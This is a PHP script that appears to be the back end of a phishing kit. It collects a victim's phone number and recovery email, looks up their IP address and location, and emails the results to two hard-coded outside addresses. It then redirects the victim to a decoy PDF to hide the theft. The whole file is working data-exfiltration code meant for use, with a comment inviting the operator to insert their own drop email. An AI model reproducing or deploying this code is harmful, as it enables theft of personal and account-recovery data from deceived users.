<?php
if($_POST["phoneNumber"] != "" and $_POST["recEmail"] != ""){
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$message .= "--------------PHONE ETC-----------------------\n";
$message .= "phone: ".$_POST['phoneNumber']."\n";
$message .= "recovery: ".$_POST['recEmail']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "IP Address: ".$ip."\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "Date: ".$adddate."\n";
$message .= "-------------------------------------\n";
//change ur email here
$send = "guygreg@yandex.ru,walexzeefire@gmail.com";
$subject = "Result - ".$country;
$headers = "From: PHONE ETC<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

 
     header("Location: https://www.docdroid.net/PSyoPD5/sales-agreement.pdf");
}else{
header("Location: index.php");
}

?>
